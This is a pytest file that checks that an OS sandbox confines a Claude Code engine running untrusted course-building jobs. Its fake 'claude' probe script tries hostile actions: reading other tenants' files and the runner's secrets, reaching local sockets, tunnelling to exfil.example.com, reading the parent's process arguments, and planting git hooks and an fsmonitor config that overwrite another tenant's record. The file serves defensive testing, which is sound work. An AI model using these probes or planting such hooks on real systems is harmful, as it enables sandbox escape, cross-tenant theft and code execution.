"""A Course Studio job can touch only its own run.

The engine runs untrusted request and feedback text, and its tools include arbitrary
Python, so Claude Code's tool permissions are not a boundary. The runner puts the whole
engine process tree in an OS sandbox (tools/arc2/confine.py) that denies by default. A
job may write only its own run, its request file and its own throwaway home. It may
read the repository and its own run. It cannot reach:

* other runs, ``_studio/`` (where ownership lives), ``_queue/``, ``_jobs/`` or ``_history/``;
* the runner account's home: other jobs' Claude sessions, ``~/.gitconfig``, ``~/.ssh``;
* local services: the Docker socket, the API, Redis;
* other processes (no signals to them, no reading their arguments);
* the runner's environment beyond an allow-list.

The runner's git snapshot after a job must not run anything the job planted, and must
not follow a run folder the job replaced with a link. Without a sandbox the runner does
not start unless an operator opts out explicitly.

The end-to-end cases run a hostile fake ``claude`` through ``runner.main``. They need
macOS (Seatbelt) and are skipped elsewhere; the fail-closed and profile cases run
everywhere.
"""

from __future__ import annotations

import contextlib
import json
import os
import shutil
import socket
import stat
import subprocess
import sys
import threading
from pathlib import Path

import pytest
from arc2 import confine, runner

SLUG = "arc2-mine"

PROBE = r"""#!/usr/bin/python3
import errno, json, os, signal, socket, subprocess, sys
runs, repo, probe = os.environ["PROBE_RUNS"], os.environ["PROBE_REPO"], os.environ["PROBE_NAME"]
real_home, port, runner_pid = os.environ["PROBE_REAL_HOME"], int(os.environ["PROBE_PORT"]), int(os.environ["PROBE_PARENT"])
results = {}
def attempt(name, fn):
    try:
        fn()
        results[name] = "allowed"
    except OSError:
        results[name] = "denied"
def write(path):
    return lambda: open(path, "w").write("x")
def read(path):
    return lambda: open(path).read()
def connect_tcp():
    socket.create_connection(("127.0.0.1", port), timeout=2).close()
def connect_unix():
    s = socket.socket(socket.AF_UNIX); s.settimeout(2); s.connect(os.environ["PROBE_UNIX"]); s.close()
attempt("write_own_run", write(f"{runs}/arc2-mine/own.txt"))
attempt("write_request_file", write(f"{runs}/arc2-mine.request.txt"))
attempt("write_own_home", write(os.path.join(os.environ["HOME"], "scratch.txt")))
attempt("write_other_run", write(f"{runs}/arc2-other/stolen.txt"))
attempt("write_studio_owner", write(f"{runs}/_studio/arc2-other.json"))
attempt("write_queue", write(f"{runs}/_queue/forged.json"))
attempt("write_history", write(f"{runs}/_history/forged"))
attempt("write_repo", write(f"{repo}/tools/arc2/{probe}"))
attempt("write_runner_home", write(f"{real_home}/{probe}"))
attempt("read_other_run", read(f"{runs}/arc2-other/secret.md"))
attempt("read_studio", read(f"{runs}/_studio/arc2-other.json"))
attempt("read_job_records", read(f"{runs}/_jobs/job000001.json"))
attempt("read_via_symlink", read(f"{runs}/arc2-mine/link"))
attempt("read_runner_home", read(os.environ["PROBE_HOME_FILE"]))
attempt("read_repo", read(f"{repo}/tools/arc2/check.py"))
attempt("read_repo_env_file", read(os.environ["PROBE_ENV_FILE"]))
attempt("connect_localhost", connect_tcp)
attempt("connect_unix_socket", connect_unix)
attempt("signal_runner", lambda: os.kill(runner_pid, 0))
attempt("read_runner_environ", read(f"/proc/{runner_pid}/environ"))
def direct_out():
    try:
        socket.create_connection(("192.0.2.1", 443), timeout=2).close()  # TEST-NET: never answers
        return "connected"
    except PermissionError:
        return "blocked"  # refused by the sandbox (EPERM), not merely unreachable
    except OSError as exc:
        if exc.errno == errno.ENETUNREACH:
            return "blocked"  # a network namespace with no route out at all (bubblewrap)
        return "unreachable"
results["direct_internet"] = direct_out()
def via_proxy(host):
    proxy = os.environ.get("HTTPS_PROXY", "")
    if not proxy:
        return "no-proxy"
    p_host, p_port = proxy.rsplit("/", 1)[-1].split(":")
    s = socket.create_connection((p_host, int(p_port)), timeout=5)
    s.sendall(f"CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\n\r\n".encode())
    reply = s.recv(64).decode("latin-1")
    s.close()
    return "tunnelled" if " 200 " in reply else "refused" if " 403 " in reply else reply[:20]
results["proxy_other_host"] = via_proxy("exfil.example.com")
results["sees_runner_secret"] = "PROBE_RUNNER_SECRET" in os.environ
results["home_is_fresh"] = os.environ["HOME"] != real_home and os.environ.get("CLAUDE_CONFIG_DIR", "").startswith(os.environ["HOME"])
# Plant things the runner's history snapshot would run or follow, outside the sandbox.
gitdir = f"{runs}/arc2-mine/.git"
os.makedirs(f"{gitdir}/hooks", exist_ok=True)
hook = f"#!/bin/sh\necho owned > {runs}/_studio/arc2-other.json\ntouch {runs}/HOOK_RAN\n"
for name in ("pre-commit", "post-commit", "pre-auto-gc", "reference-transaction"):
    open(f"{gitdir}/hooks/{name}", "w").write(hook); os.chmod(f"{gitdir}/hooks/{name}", 0o755)
open(f"{gitdir}/config", "w").write(f"[core]\n\thooksPath = {gitdir}/hooks\n\tfsmonitor = {gitdir}/hooks/pre-commit\n")
open(f"{runs}/arc2-mine/HEAD", "w").write("ref: refs/heads/main\n")
open(f"{runs}/arc2-mine/probe.json", "w").write(json.dumps(results))
print(json.dumps({"type": "result", "is_error": False, "result": "probed"}), flush=True)
"""

needs_seatbelt = pytest.mark.skipif(
    sys.platform != "darwin" or not shutil.which("sandbox-exec"), reason="Seatbelt (sandbox-exec) is macOS only"
)

# Every OS sandbox this host has; the end-to-end cases run once per backend.
SANDBOXES = [name for name in ("seatbelt", "bubblewrap") if confine.BACKENDS[name]().available()] or [
    pytest.param("none-available", marks=pytest.mark.skip(reason="no OS sandbox on this host"))
]
# Documented gaps (confine.Bubblewrap): Linux shares the network namespace, so local
# services stay reachable from a job unless the host firewall blocks the runner account.
KNOWN_GAPS: dict = {}  # none since bubblewrap jobs got their own network namespace


@pytest.fixture
def runs(tmp_path) -> Path:
    root = (tmp_path / "runs").resolve()
    (root / SLUG).mkdir(parents=True)
    (root / "arc2-other").mkdir()
    (root / "arc2-other" / "secret.md").write_text("another tenant's answer key")
    (root / "_studio").mkdir()
    (root / "_studio" / "arc2-other.json").write_text(json.dumps({"tenant_id": "other"}))
    (root / "_history").mkdir()
    (root / SLUG / "link").symlink_to(root / "arc2-other" / "secret.md")
    return root


@pytest.fixture
def listener(tmp_path):
    """A TCP service on localhost and a Unix socket, as the API, Redis or Docker would be."""
    tcp = socket.socket()
    tcp.bind(("127.0.0.1", 0))
    tcp.listen(8)
    path = Path("/tmp") / f"arc2-probe-{os.getpid()}-{tmp_path.name[-8:]}.sock"
    unix = socket.socket(socket.AF_UNIX)
    unix.bind(str(path))
    unix.listen(8)
    stop = threading.Event()

    def serve(sock):
        sock.settimeout(0.2)
        while not stop.is_set():
            with contextlib.suppress(OSError):
                sock.accept()[0].close()

    for sock in (tcp, unix):
        threading.Thread(target=serve, args=(sock,), daemon=True).start()
    yield tcp.getsockname()[1], path
    stop.set()
    tcp.close()
    unix.close()
    path.unlink(missing_ok=True)


@pytest.fixture
def probe_engine(tmp_path, monkeypatch, runs, listener):
    port, unix_path = listener
    exe = tmp_path / "claude"
    exe.write_text(PROBE.replace("#!/usr/bin/python3", f"#!{sys.executable}", 1))
    exe.chmod(exe.stat().st_mode | stat.S_IEXEC)
    name = f"_arc2_probe_{tmp_path.name}"
    home_file = Path.home() / f".{name}"
    home_file.write_text("the runner account's own file")
    env_file = runner.REPO_ROOT / f".env.{name}"
    env_file.write_text("SECRET=1")
    monkeypatch.setenv(
        "ARC2_JOB_ENV",
        "PROBE_RUNS,PROBE_REPO,PROBE_NAME,PROBE_REAL_HOME,PROBE_PORT,PROBE_UNIX,"
        "PROBE_PARENT,PROBE_HOME_FILE,PROBE_ENV_FILE",
    )
    for key, value in {
        "PROBE_RUNS": runs,
        "PROBE_REPO": runner.REPO_ROOT,
        "PROBE_NAME": name,
        "PROBE_REAL_HOME": Path.home(),
        "PROBE_PORT": port,
        "PROBE_UNIX": unix_path,
        "PROBE_PARENT": os.getpid(),
        "PROBE_HOME_FILE": home_file,
        "PROBE_ENV_FILE": env_file,
        "PROBE_RUNNER_SECRET": "s3cret",
        "ARC2_FALLBACK": "off",
    }.items():
        monkeypatch.setenv(key, str(value))
    monkeypatch.delenv("ARC2_JOB_ENV_EXTRA", raising=False)
    yield exe
    for leftover in (runner.REPO_ROOT / "tools" / "arc2" / name, Path.home() / name, home_file, env_file):
        leftover.unlink(missing_ok=True)


def queue_job(runs: Path) -> None:
    queue, _ = runner.dirs(runs)
    job = {"id": "job000001", "action": "start", "slug": SLUG, "text": "a course", "created_at": "2026-10-04T12:00:00Z"}
    (queue / "20261004T120000-job000001.json").write_text(json.dumps(job))


EXPECTED = {
    "write_own_run": "allowed",
    "write_request_file": "allowed",
    "write_own_home": "allowed",
    "write_other_run": "denied",
    "write_studio_owner": "denied",
    "write_queue": "denied",
    "write_history": "denied",
    "write_repo": "denied",
    "write_runner_home": "denied",
    "read_other_run": "denied",
    "read_studio": "denied",
    "read_job_records": "denied",
    "read_via_symlink": "denied",
    "read_runner_home": "denied",
    "read_repo": "allowed",
    "read_repo_env_file": "denied",
    "connect_localhost": "denied",
    "connect_unix_socket": "denied",
    "signal_runner": "denied",
    "read_runner_environ": "denied",
    "direct_internet": "blocked",
    "proxy_other_host": "refused",
    "sees_runner_secret": False,
    "home_is_fresh": True,
}


@pytest.mark.parametrize("sandbox", SANDBOXES)
def test_a_confined_job_reaches_only_its_own_run(runs, probe_engine, monkeypatch, sandbox):
    monkeypatch.setenv("ARC2_CONFINE", sandbox)
    queue_job(runs)
    assert runner.main(["--runs", str(runs), "--claude", str(probe_engine), "--once"]) == 0
    record = json.loads((runs / "_jobs" / "job000001.json").read_text())
    assert record["state"] == "done", record
    assert record["confinement"] == sandbox
    assert json.loads((runs / SLUG / "probe.json").read_text()) == {**EXPECTED, **KNOWN_GAPS.get(sandbox, {})}
    assert not (runs / "arc2-other" / "stolen.txt").exists()
    assert not list(Path(os.environ["ARC2_JOB_HOMES"]).glob("*")), "the job's home is removed afterwards"


@pytest.mark.parametrize("sandbox", SANDBOXES)
def test_the_history_snapshot_runs_nothing_the_job_planted(runs, probe_engine, monkeypatch, sandbox):
    monkeypatch.setenv("ARC2_CONFINE", sandbox)
    queue_job(runs)
    runner.main(["--runs", str(runs), "--claude", str(probe_engine), "--once"])
    record = json.loads((runs / "_jobs" / "job000001.json").read_text())
    assert record.get("history_commit"), record
    assert not (runs / "HOOK_RAN").exists(), "a hook the job planted ran"
    assert json.loads((runs / "_studio" / "arc2-other.json").read_text()) == {"tenant_id": "other"}
    files = subprocess.run(
        ["git", f"--git-dir={runs / '_history' / f'{SLUG}.git'}", "ls-files"], capture_output=True, text=True
    ).stdout.split()
    assert "probe.json" in files and not any(f.startswith(".git/") for f in files)


@pytest.mark.parametrize("target", ["repo", "other_run"])
def test_a_run_folder_replaced_by_a_link_is_not_recorded(tmp_path, runs, target):
    other = runs / "arc2-other"
    (runs / SLUG / "link").unlink()
    (runs / SLUG).rmdir()
    (runs / SLUG).symlink_to(runner.REPO_ROOT if target == "repo" else other, target_is_directory=True)
    record = {"id": "job000001", "action": "start", "slug": SLUG, "text": "x", "state": "done", "engine": "claude"}
    head = subprocess.run(["git", "-C", str(runner.REPO_ROOT), "rev-parse", "HEAD"], capture_output=True, text=True)
    assert runner.snapshot(runs, record, tmp_path / "missing.log") is None
    assert not (runs / "_history" / f"{SLUG}.git").exists()
    after = subprocess.run(["git", "-C", str(runner.REPO_ROOT), "rev-parse", "HEAD"], capture_output=True, text=True)
    assert head.stdout == after.stdout
    assert not (other / "_transcripts").exists()


def _no_sandboxes(monkeypatch):
    for backend in (confine.Seatbelt, confine.Bubblewrap):
        monkeypatch.setattr(backend, "available", lambda self: False)


def test_without_a_sandbox_the_runner_does_not_start(runs, tmp_path, monkeypatch):
    monkeypatch.setenv("ARC2_CONFINE", "auto")
    _no_sandboxes(monkeypatch)
    queue_job(runs)
    assert runner.main(["--runs", str(runs), "--claude", str(tmp_path / "never-run"), "--once"]) == 2
    assert [p.name for p in (runs / "_queue").glob("*.json")] == ["20261004T120000-job000001.json"]


@pytest.mark.parametrize("choice", ["auto", "seatbelt", "bubblewrap", "firejail", "yes"])
def test_an_unavailable_or_unknown_sandbox_is_an_error_not_a_downgrade(monkeypatch, choice):
    _no_sandboxes(monkeypatch)
    with pytest.raises(confine.ConfinementError):
        confine.select(choice)


def test_running_unconfined_takes_an_explicit_choice():
    assert confine.select("none").name == "none"


def test_the_profile_denies_by_default_and_allows_the_job_last(tmp_path):
    runs = tmp_path / 'we"ird\\runs'
    jail = confine.Jail(
        repo=tmp_path / "repo",
        runs=runs,
        home=tmp_path,
        writable=(runs / SLUG, tmp_path / "home"),
        writable_files=(runs / f"{SLUG}.request.txt",),
        local_ports=(11434,),
    )
    profile = confine.Seatbelt().profile(jail)
    r = str(runs.resolve()).replace("\\", "\\\\").replace('"', '\\"')
    assert "(deny file-write*)\n" in profile
    assert f'(deny file-read-data (subpath "{r}"))' in profile
    allow = profile.index(f'(allow file-read-data file-write* (subpath "{r}/{SLUG}")')
    assert profile.index("(deny file-write*)") < profile.index(f'(deny file-read-data (subpath "{r}"))') < allow
    assert f'(literal "{r}/{SLUG}.request.txt")' in profile
    assert "(deny network-outbound (remote unix-socket))" in profile
    assert '(allow network-outbound (remote ip "localhost:11434"))' in profile
    assert "(deny signal (target others))" in profile
    repo = str((tmp_path / "repo").resolve())
    assert f'(subpath "{repo}/build/arc2") (subpath "{repo}/.claude/worktrees")' in profile


def test_the_job_environment_is_an_allow_list(tmp_path, monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgresql://secret")
    monkeypatch.setenv("SOME_RUNNER_TOKEN", "secret")
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "the-runner-token")
    env = runner.job_env(tmp_path / "home")
    assert "DATABASE_URL" not in env and "SOME_RUNNER_TOKEN" not in env
    assert env["CLAUDE_CODE_OAUTH_TOKEN"] == "the-runner-token"
    assert env["HOME"] == str(tmp_path / "home") and env["CLAUDE_CONFIG_DIR"] == str(tmp_path / "home" / ".claude")


def test_the_engine_ignores_user_settings_and_may_edit_only_its_own_run():
    job = {"id": "job000001", "action": "start", "slug": SLUG, "text": "a course"}
    cmd = runner.command_for(job, "claude")
    assert f"Write(./build/arc2/{SLUG}/**)" in cmd and f"Edit(./build/arc2/{SLUG}/**)" in cmd
    assert "Write(./build/arc2/**)" not in cmd and "Edit(./build/arc2/**)" not in cmd
    assert cmd[cmd.index("--setting-sources") + 1] == "project" and "--strict-mcp-config" in cmd


PROCARGS_PROBE = r"""#!/usr/bin/python3
import ctypes, json, os, sys
libc = ctypes.CDLL(None)
def procargs(pid):
    mib = (ctypes.c_int * 3)(1, 49, pid)  # CTL_KERN, KERN_PROCARGS2
    size = ctypes.c_size_t(1 << 20)
    buf = ctypes.create_string_buffer(size.value)
    if libc.sysctl(mib, 3, buf, ctypes.byref(size), None, 0) != 0:
        return None
    return buf.raw[: size.value]
seen = procargs(os.getppid())
run = os.path.join(os.environ["PROBE_RUNS"], "arc2-mine")
json.dump({"readable": seen is not None, "secret": seen is not None and b"s3cret-runner-value" in seen,
           "prompt_on_argv": any("a course" in a for a in sys.argv)}, open(os.path.join(run, "procargs.json"), "w"))
print(json.dumps({"type": "result", "is_error": False, "result": "probed"}), flush=True)
"""


@needs_seatbelt
def test_the_runners_own_environment_holds_nothing_a_job_could_read(runs, tmp_path):
    """macOS lets a process read a same-account process's original environment
    (KERN_PROCARGS2) and Seatbelt cannot stop it, so the runner re-executes itself with
    a scrubbed environment and passes prompts on stdin. Run as a real process."""
    exe = tmp_path / "claude"
    exe.write_text(PROCARGS_PROBE.replace("#!/usr/bin/python3", f"#!{sys.executable}", 1))
    exe.chmod(exe.stat().st_mode | stat.S_IEXEC)
    queue_job(runs)
    env = {
        "PATH": os.environ["PATH"],
        "HOME": os.environ["HOME"],
        "PYTHONPATH": "tools",
        "ARC2_CONFINE": "seatbelt",
        "ARC2_FALLBACK": "off",
        "ARC2_JOB_HOMES": str(tmp_path / "homes"),
        "ARC2_OAUTH_TOKEN_FILE": str(tmp_path / "none"),
        "ARC2_JOB_ENV": "PROBE_RUNS",
        "PROBE_RUNS": str(runs),
        "DATABASE_URL": "postgresql://user:s3cret-runner-value@db/tn",
    }
    done = subprocess.run(
        [sys.executable, "-m", "arc2.runner", "--runs", str(runs), "--claude", str(exe), "--once"],
        cwd=runner.REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert done.returncode == 0, done.stderr
    seen = json.loads((runs / SLUG / "procargs.json").read_text())
    assert seen["readable"], "the probe should be able to read the runner (that is the point of the test)"
    assert seen["secret"] is False, "the runner's original environment still held a secret"
    assert seen["prompt_on_argv"] is False


def test_the_runner_keeps_only_its_own_settings_and_forwarded_names():
    env = runner.clean_runner_env(
        {
            "PATH": "/bin",
            "DATABASE_URL": "x",
            "AWS_SECRET_ACCESS_KEY": "y",
            "ARC2_CONFINE": "auto",
            "ARC2_JOB_ENV": "FOO",
            "FOO": "1",
            "BAR": "2",
        }
    )
    assert env == {"PATH": "/bin", "ARC2_CONFINE": "auto", "ARC2_JOB_ENV": "FOO", "FOO": "1", "ARC2_RUNNER_CLEAN": "1"}
